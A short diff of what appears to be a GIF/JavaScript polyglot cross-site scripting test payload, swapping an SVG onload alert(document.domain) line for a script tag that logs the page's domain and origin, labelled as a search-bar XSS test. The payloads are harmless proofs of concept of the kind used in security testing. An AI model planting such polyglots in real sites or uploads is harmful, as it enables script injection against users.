@@ -1,1 +1,2 @@
-GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+GIF89a/*<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
+//;
